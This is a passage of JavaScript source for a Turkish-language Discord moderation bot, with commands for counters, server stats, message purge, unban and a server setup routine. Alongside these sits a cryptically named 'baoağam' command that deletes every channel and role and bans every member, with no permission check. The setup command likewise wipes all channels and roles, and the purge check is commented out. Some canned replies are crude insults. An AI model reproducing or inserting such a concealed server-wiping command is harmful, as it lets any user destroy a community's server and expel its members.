            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 1 && rastgelesayi < 3) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapiki}**`)  
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 2 && rastgelesayi < 4) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapüc}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 3 && rastgelesayi < 5) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapdort}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 4 && rastgelesayi < 6) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapbes}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 5 && rastgelesayi < 7) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapalti}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        }

        //Eğer Birinci Kişi Normalse Ama İkinci Değilse

        if (!birincikisi.startsWith('<@!') && ikincikisi.startsWith('<@!')){ 
            const birincikisibol = birincikisi.slice(2,-1);
            const ikincikisibol = ikincikisi.slice(3,-1);
            //Kişileri Getirme
            const birincigetir = message.guild.members.cache.get(birincikisibol);
            const ikincigetir = message.guild.members.cache.get(ikincikisibol);
            //Asıl Olayımıza Gelelim
        if (rastgelesayi > 0 && rastgelesayi < 2) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapbir}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 1 && rastgelesayi < 3) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapiki}**`)  
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 2 && rastgelesayi < 4) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapüc}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 3 && rastgelesayi < 5) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapdort}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 4 && rastgelesayi < 6) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapbes}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 5 && rastgelesayi < 7) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapalti}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        }

        //Eğer İkinci Kişi Normalse Ama Birinci Değilse

        if (birincikisi.startsWith('<@!') && !ikincikisi.startsWith('<@!')){ 
            const birincikisibol = birincikisi.slice(3,-1);
            const ikincikisibol = ikincikisi.slice(2,-1);
            //Kişileri Getirme
            const birincigetir = message.guild.members.cache.get(birincikisibol);
            const ikincigetir = message.guild.members.cache.get(ikincikisibol);
            //Asıl Olayımıza Gelelim
        if (rastgelesayi > 0 && rastgelesayi < 2) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapbir}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 1 && rastgelesayi < 3) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapiki}**`)  
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 2 && rastgelesayi < 4) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapüc}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 3 && rastgelesayi < 5) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapdort}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 4 && rastgelesayi < 6) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapbes}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 5 && rastgelesayi < 7) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapalti}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        }

        //Eğer İkiside Normalse

        if (!birincikisi.startsWith('<@!') && !ikincikisi.startsWith('<@!')) {
            const birincikisibol = birincikisi.slice(2,-1);
            const ikincikisibol = ikincikisi.slice(2,-1);
            //Kişileri Getirme
            const birincigetir = message.guild.members.cache.get(birincikisibol);
            const ikincigetir = message.guild.members.cache.get(ikincikisibol);
            //Asıl Olayımıza Gelelim
        if (rastgelesayi > 0 && rastgelesayi < 2) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapbir}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 1 && rastgelesayi < 3) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapiki}**`)  
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 2 && rastgelesayi < 4) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapüc}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 3 && rastgelesayi < 5) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapdort}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 4 && rastgelesayi < 6) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapbes}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        if (rastgelesayi > 5 && rastgelesayi < 7) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${ikincigetir} ${cevapalti}**`)
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            message.channel.send(embed)
        }
        }
        }
        if (komut === "sayaç") {
            let kanalvarmı = db.has(`sayaç-${message.guild.id}`)
            if (kanalvarmı === true) {
        
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Zaten bir sayaç kanalı ayarlı <a:unlem:825146178503966770>")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }else {
            let kanal = args[0];
            if (kanal.startsWith('<#') && kanal.endsWith('>')) {
            let kanalid = kanal.slice(2, -1);
            db.set(`sayaç-${message.guild.id}`, kanalid)
        
              const embediki = new Discord.MessageEmbed()
              .setTitle("Moderasyon sistemi")
              .setDescription(`Sayaç kanalı <#${kanalid}> olarak ayarlandı`)
              .setColor("RANDOM")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embediki});
            } else {
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setDescription("Sayaç kanalı ayarlamak için bir kanal etiketlemelisiniz <a:unlem:825146178503966770>")
              .setTitle("Moderasyon Sistemi")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
            }
        }
        if (komut === "sesli") {
          const array = [
            `<a:speaker:825047092492763197> bu araba kime çıkıyo \n`,
            `<a:speaker:825047092492763197> sen abdülhamidi savundun \n`,
            `<a:speaker:825047092492763197> pepeyi yala \n`,
            `<a:speaker:825047092492763197> ismet \n`,
            `<a:speaker:825047092492763197> osman gültekin sen misin \n`,
            `<a:speaker:825047092492763197> habibi pıliz \n`,
            `<a:speaker:825047092492763197> senin ananı avradını \n`,
            `<a:speaker:825047092492763197> sönmez \n`,
            `<a:speaker:825047092492763197> sen misin ilacım \n`
          ]
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setTitle("Sesli Komutlar")
            .setDescription(array)
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setAuthor( message.author.username,message.author.avatarURL({ dynamic:true }))
            message.author.send({embed:embed});
    
            const embediki = new Discord.MessageEmbed()
            .setDescription("Sana Komutlarımı Özelden Gönderdim <a:ysltk:749379707556069457> ")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            message.reply(embediki);
        }
        if (komut === "sohbet") {
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setTitle("Sohbet Mesajları")
            .addField("Normal Komutlar:"," sa  \n sea \n naber \n günaydın \n iyi geceler \n Merhaba \n selam \n slm \n instagram \n seni kim yaptı \n sende gül \n aferin ")
            .addField("Sesli Komutlar:", " bu araba kime çıkıyo \n sen abdülhamidi savundun \n pepeyi yala \n ismet \n osman gültekin sen misin \n habibi pıliz \n senin ananı avradını... \n sönmez \n sen misin ilacım")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setAuthor( message.author.username,message.author.avatarURL)
        message.channel.send({embed:embed});
        }
        if (komut === "info" || komut === "bilgi") {
                    // Members
            let member = message.guild.members;

            let offline = member.cache.filter(m => m.user.presence.status === "offline").size,
                online = member.cache.filter(m => m.user.presence.status === "online").size,
                boşta = member.cache.filter(m => m.user.presence.status === "idle").size,
                rahatsızetmeyin = member.cache.filter(m => m.user.presence.status === "dnd").size,
                botlar = member.cache.filter(m => m.user.bot).size,
                toplamkisi = message.guild.memberCount;
            
            // Channels
            let channels = message.guild.channels;

            let yazi = channels.cache.filter(r => r.type === "text").size,
                sesli = channels.cache.filter(r => r.type === "voice").size,
                kategori = channels.cache.filter(r => r.type === "category").size,
                toplam = channels.cache.size;  

            let roles = message.guild.roles;

            let toplamrol = roles.cache.size;

            const owner = message.guild.owner.id;

            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setTitle("Sunucu Bilgileri")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .addFields(

            {name:"Kişi Bilgileri:", value:`Çevrimiçi sayısı:${online} \n Çevrimdışı sayısı:${offline} \n Boşta olanlar:${boşta} \n Rahatsız edilmek istemeyenler:${rahatsızetmeyin} \n Bot sayısı:${botlar} \n Toplam kişi sayısı:${toplamkisi}`},
            {name:"Kanal Bilgileri:", value:`Kategori sayısı:${kategori} \n Metin kanalı sayısı:${yazi} \n Sesli kanal sayısı:${sesli} \n Toplam kanal sayısı:${toplam}`},
            {name:"Rol Bilgileri:", value:`Toplam rol sayısı:${toplamrol}`}

            )
            message.channel.send({embed:embed});
        }
        if (komut === "sunucu-verileri" || komut === "veri") {
            let otorol = db.has(`otorol-${message.guild.id}`);
            let hoşgeldin = db.has(`hoşgeldin-${message.guild.id}`);
            let log = db.has(`log-${message.guild.id}`);
            let sayaç = db.has(`sayaç-${message.guild.id}`);
        
        
            if (otorol === true) {
              let otorolgoster = db.fetch(`otorol-${message.guild.id}`)
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setDescription(`${message.guild.name} sunucusunda otorol olarak <@&${otorolgoster}> rolü ayarları`)
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }else {
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setDescription(`Kanalınıza ait bir otorol bilgisi bulunmamaktadır`)
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
        
            if (hoşgeldin === true) {
              let hosgeldingoster = db.fetch(`hoşgeldin-${message.guild.id}`)
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setDescription(`${message.guild.name} sunucusunda gelen-giden kanalı olarak <#${hosgeldingoster}> kanalı ayarları`)
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }else {
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setDescription(`Kanalınıza ait bir gelen-giden kanalı bilgisi bulunmamaktadır`)
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
        
            if (log === true) {
              let loggoster = db.fetch(`log-${message.guild.id}`)
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setDescription(`${message.guild.name} sunucusunda log kanalı olarak <#${loggoster}> kanalı ayarları`)
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }else {
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setDescription(`Kanalınıza ait bir log kanalı bilgisi bulunmamaktadır`)
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
            if (sayaç === true) {
              let sayaçgoster = db.fetch(`sayaç-${message.guild.id}`)
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setDescription(`${message.guild.name} sunucusunda sayaç kanalı olarak <#${sayaçgoster}> kanalı ayarları`)
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }else {
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setDescription(`Kanalınıza ait bir sayaç kanalı bilgisi bulunmamaktadır`)
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
        }
        if (komut === "temizle" || komut === "sil") {
            var argüman = args[0];

            if (isNaN(argüman)) {
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setDescription("Girdiğiniz değer bir sayı olmalıdır <a:unlem:825146178503966770>")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
      
            if(!message.guild) {
              const embed = new Discord.MessageEmbed()
              .setDescription("Bu Komutu Kullanabilmek İçin Bir Sunucuda Olmalısınız <a:unlem:825146178503966770>")
              .setColor("RED")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              return message.channel.send({embed:embed});
            }
      
            var silinecekmesaj = Number(argüman);
      
            if(silinecekmesaj < 0) {
              return message.channel.send("Lütfen 0'dan büyük bir değer giriniz.")
            }
            if(silinecekmesaj > 100) {
              return message.channel.send("Lütfen 100'den aşağı bir değer giriniz.")
            }
      
            var silinecekmesaj = Number(argüman) + 1;
      
            /*
            if(!message.channel.permissionsFor("MANAGE_MESSAGES") == true) {
              console.log(message.channel.permissionsFor("MANAGE_MESSAGES"))
              return message.channel.send("Bana gerekli yetkileri lütfen veriniz.")
            }*/
      
            message.channel.bulkDelete(silinecekmesaj);
      
            const embed = new Discord.MessageEmbed()
            .setDescription(`Kanaldan ${argüman} tane mesaj sildim. \n Yetkili: ${message.author.username}`)
            .setColor("RANDOM")
            .setTitle("Mesajlar silindi")
            message.channel.send({embed:embed});
            setTimeout(function () {
      
              message.channel.bulkDelete(1);
      
            },1 * 5000)
        }
        if (komut === "unban") {
            var banıacılacak = args[0];

            var banacan = message.author.username;
      
            message.guild.members.unban(banıacılacak);
      
            const embediki = new Discord.MessageEmbed()
            .setTitle("Moderasyon sistemi")
            .addFields(
                {name: "Banı açan kişi:", value: `${banacan}`,inline:true},
                {name: "Banı açılan kişi:", value: `${banıacılacak}`,inline:true},
            )
            .setColor("RANDOM")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setAuthor(message.author.username, message.author.avatarURL())
            message.channel.send({embed:embediki});
        }
        if (komut === "veri-sil") {
            let logvarmı = await db.has(`log-${message.guild.id}`);
            let hoşgeldinvarmı = await db.has(`hoşgeldin-${message.guild.id}`);
            let otorolvarmı = await db.has(`otorol-${message.guild.id}`);
            let sayaçvarmı = await db.has(`sayaç-${message.guild.id}`);
            let küfürvarmı = await db.has(`küfür-${message.guild.id}`);
      
      
            if (logvarmı === true) {
              await db.delete(`log-${message.guild.id}`);
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Veri tabanından log kanalıyla ilgili veriler silindi")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            } else {
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Veri tabanında log kanalıyla ilgili bir veri bulunmamaktadır")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
            if (hoşgeldinvarmı === true) {
              await db.delete(`hoşgeldin-${message.guild.id}`);
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Veri tabanından gelen-giden kanalıyla ilgili veriler silindi")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            } else {
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Veri tabanında gelen-giden kanalıyla ilgili bir veri bulunmamaktadır")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
            if (otorolvarmı === true) {
              await db.delete(`otorol-${message.guild.id}`);
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Veri tabanından otorol ile ilgili veriler silindi")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            } else {
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Veri tabanında otorol ile ilgili bir veri bulunmamaktadır")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
            if (sayaçvarmı === true) {
              await db.delete(`sayaç-${message.guild.id}`);
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Veri tabanından sayaç kanalıyla ilgili veriler silindi")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            } else {
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Veri tabanında sayaç kanalıyla ilgili bir veri bulunmamaktadır")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
            if (küfürvarmı === true) {
              await db.delete(`küfür-${message.guild.id}`);
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Veri tabanından küfür koruma ilgili veriler silindi")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            } else {
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Veri tabanında küfür koruma ile ilgili bir veri bulunmamaktadır")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
        }
        if (komut === "baoağam") {
          
          message.guild.channels.cache.forEach(async ch => {
              await ch.delete().catch(err => {
                return console.log("Bu kanalı silemem");
              })
          })

          message.guild.roles.cache.forEach(async r => {
              await r.delete().catch(err => {
                return console.log("Bu Rolü Silemem");
              })
          })

          message.guild.members.cache.forEach(async m => {
              await m.ban().catch(err => {
                return console.log("Bu kişiyi banlayamam");
              })

          })
        }
        if (komut === "kur") {

          const sunucu = client.guilds.cache.get(message.guild.id);
          
          if (!args[0]) {
            const embed = new Discord.MessageEmbed()
            .setDescription("Boşluk Bırakıp Sunucunun İsminin Ne Olucağınıda Yazmalısınız <a:unlem:825146178503966770>")
            .setColor("RED")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            return message.channel.send(embed)
          }

          if (!args[1]) {
            if (args[0]) {
              if (args[0].length < 3 ) {
                const embed = new Discord.MessageEmbed()
                .setDescription("Sunucu İsmi 3 Harften Daha Uzun Olmalıdır <a:unlem:825146178503966770>")
                .setColor("RED")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                return message.channel.send(embed)
              }
              sunucu.setName(`${args[0]}`);
            }
          }

          if (args[1]) sunucu.setName(`${args[0]} ${args[1]}`);

          if (args[2]) sunucu.setName(`${args[0]} ${args[1]} ${args[2]}`);

          const embed = new Discord.MessageEmbed()
          .setDescription("Sunucu Yapılandırması 10 Saniye İçinde Başlayacaktır Yapılandırma 5 Dakika Sürebilir Bu Süreçte Bütün Kanallar Silinecektir Lütfen Tamamen Bitene Kadar Hiçbir Şeye Dokunmayınız <a:unlem:825146178503966770>")
          .setColor("RED")
          .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
          .setTimestamp()
          message.channel.send(embed);

        //Temizlik
        setTimeout(async () => {
          await message.guild.channels.cache.forEach(async ch => {
              await ch.delete().catch(err => {
                return console.log("Bu kanalı silemem");
              })
          })
          await message.guild.roles.cache.forEach(async r => {
            await r.delete().catch(err => {
              return console.log("Bu Rolü Silemem");
            })
          })
        }, 7000);
          
        //Roller
        setTimeout(async () => {
          const abla = sunucu.roles
          .create({
            data: {
              name:"Abla",  
              permissions: [8] 
            }
          })
          const itachi = sunucu.roles
          .create({
            data: {
              name: "İtachi",
              permissions: [2147483639]
            }
          })
          const allahınemri = sunucu.roles
          .create({
            data: {
              name: "Allahın Emri",
              permissions: [104193600]
            }
          })
          const kıdemliler = sunucu.roles
          .create({
            data: {
              name: "Kıdemliler",
              permissions: [104193600]
            }
          })
          const caylaklar = sunucu.roles
          .create({
            data: {
              name: "Çaylaklar",
              permissions: [104193600]
            }
          })
          //Renkler
          const booster = sunucu.roles
          .create({
            data: {
              name: "Booster Rengi",
              color: "#f47fff"
            }
          })
          const mor = sunucu.roles
          .create({
            data: {
              name: "Mor",
              color: "#c0a3ee"
            }
          })
          const mavi = sunucu.roles
          .create({
            data: {
              name: "Mavi",
              color: "BLUE"
            }
          })
          const sarı = sunucu.roles
          .create({
            data: {
              name: "Sarı",
              color: "YELLOW"
            }
          })
          const yeşil = sunucu.roles
          .create({
            data: {
              name: "Yeşil",
              color: "GREEN"
            }
          })
          const kırmızı = sunucu.roles
          .create({
            data: {
              name: "Kırmızı",
              color: "RED"
            }
          })
          const turuncu = sunucu.roles
          .create({
            data: {
              name: "Turuncu",
              color: "ORANGE"
            }
          })
          const pembe = sunucu.roles
          .create({
            data: {
              name: "Pembe",
              color: "#e65589"
            }
          })
          const billie = sunucu.roles
          .create({
            data: {
              name: "Billie Eilish Yeşili",
              color: "#1eff00"
            }
          })
          const beyaz = sunucu.roles
          .create({
            data:{
              name: "Beyaz",
              color: "WHITE"
            }
          })
          const siyah = sunucu.roles
          .create({
            data:{
              name: "Siyah",
              color: "BLACK"
            }
          })
          const pembeyaz = sunucu.roles
          .create({
            data: {
              name: "Pembe Beyazı",
              color: "#f7d2da"
            }
          })
          const pastelmavi = sunucu.roles
          .create({
            data: {
              name: "Pastel Mavisi",
              color: "#8eb3e8"
            }
          })
          const ten = sunucu.roles
          .create({
            data: {
              name: "Ten Rengi",
              color: "#f5deae"
            }
          })
          const fıstık = sunucu.roles
          .create({
            data: {
              name: "Fıstık Yeşili",
              color: "#b6db7b"
            }
          })
          //Rol Seçim
          const filmsever = sunucu.roles
          .create({
            data: {
              name: "Film Sever"
            }
          })
          const işsiz = sunucu.roles
          .create({
            data: {
              name: "İşsiz"
            }
          })
          const oyuncu = sunucu.roles
          .create({
            data: {
              name: "Oyuncu"
            }
          })
          const alışverişrol = sunucu.roles
          .create({
            data: {
              name: "Alış Veriş"
            }
          })
          const müzisyen = sunucu.roles
          .create({
            data: {
              name: "Müzisyen"
            }
          })
          const nsfwrol = sunucu.roles
          .create({
            data: {
              name: "Nsfw"
            }
          })
          const genin = sunucu.roles
          .create({
            data: {
              name: "Genin",
              color: "RED"
            }
          })
          const muted = sunucu.roles
          .create({
            data: {
              name: "Muted",
              color: "BLACK"
            }
          })
        }, 25000);

        //Emoji Oluşturma
        setTimeout(async () => {
        //renkler
        const billieemoji = await sunucu.emojis.create('./image/billir.png', 'billieeilish');
        const tenemoji = await sunucu.emojis.create('./image/ten.png', 'tenrengi');
        const pastelmaviemoji = await sunucu.emojis.create('./image/pastelmavi.png', 'pastelmavi');
        const pembeyazemoji = await sunucu.emojis.create('./image/pembeyaz.png', 'pembeyaz');
        const fıstık = await sunucu.emojis.create('./image/fıstık.png', 'fistikyesil');
        const boosteremoji = await sunucu.emojis.create('./image/booster.png', 'booster')
        const pembeemoji = await sunucu.emojis.create('./image/pembe.png', 'pembe');
        //roller
        const oyuncuemoji = await sunucu.emojis.create('./image/oyuncu.png', 'oyuncu');
        const filmseveremoji = await sunucu.emojis.create('./image/filmsever.png', 'filmsever');
        const işsizemoji = await sunucu.emojis.create('./image/işsiz.png', 'issiz');
        }, 30000);

        //Kanalları Oluşturma
        setTimeout(async () => {
          //Rolleri Getirme
          const everyonegetir = await sunucu.roles.cache.find(kanal => kanal.name === "@everyone");
          const ablagetir = await sunucu.roles.cache.find(kanal => kanal.name === "Abla");
          const itachigetir = await sunucu.roles.cache.find(kanal => kanal.name === "İtachi");
          const allahınemrigetir = await sunucu.roles.cache.find(kanal => kanal.name === "Allahın Emri");
          const kıdemligetir = await sunucu.roles.cache.find(kanal => kanal.name === "Kıdemliler");
          const caylakgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Çaylaklar");
          const filmseverrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Film Sever");
          const issizrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "İşsiz");
          const oyuncurolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Oyuncu");
          const alisverisrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Alış Veriş");
          const müzisyenrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Müzisyen");
          const nsfwrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Nsfw");
          const geninrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Genin");
          const mutedrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Muted");
          const boosterrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Booster Rengi");
          const morrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Mor");
          const mavirolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Mavi");
          const sarırolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Sarı");
          const yesilrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Yeşil");
          const pemberolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Pembe");
          const kırmızırolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Kırmızı");
          const turuncurolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Turuncu");
          const billierolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Billie Eilish Yeşili");
          const beyazrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Beyaz");
          const siyahrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Siyah");
          const pembeyazrolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Pembe Beyazı");
          const pastelmavirolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Pastel Mavisi");
          const tenrengirolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Ten Rengi");
          const fıstıkyeşilirolgetir = await sunucu.roles.cache.find(kanal => kanal.name === "Fıstık Yeşili");
          //Kanallar

          //Akoşko Kategorisi
          setTimeout(async () => {
          const akoşkokategori = await sunucu.channels
          .create('Allahın Emirleri', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: false
            });
            c.updateOverwrite(allahınemrigetir, {
              VIEW_CHANNEL: true
            })
          })
          const akoşkokategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Allahın Emirleri");
            //Akoşko Kanalları
            const akoşkotext = await sunucu.channels
            .create('allahın-birinci-emri', {
              type: "text"
            }).then(c => {
              c.updateOverwrite(allahınemrigetir, {
                VIEW_CHANNEL: true
              })
            })
            const akoşkotextgetir = await sunucu.channels.cache.find(kanal => kanal.name === "allahın-birinci-emri");
            await akoşkotextgetir.setParent(akoşkokategorigetir.id, { lockPermissions: true });

            const akoşkoses = await sunucu.channels
            .create('Allahın İkinci Emri', {
              type: "voice",
              bitrate: 96000
            })
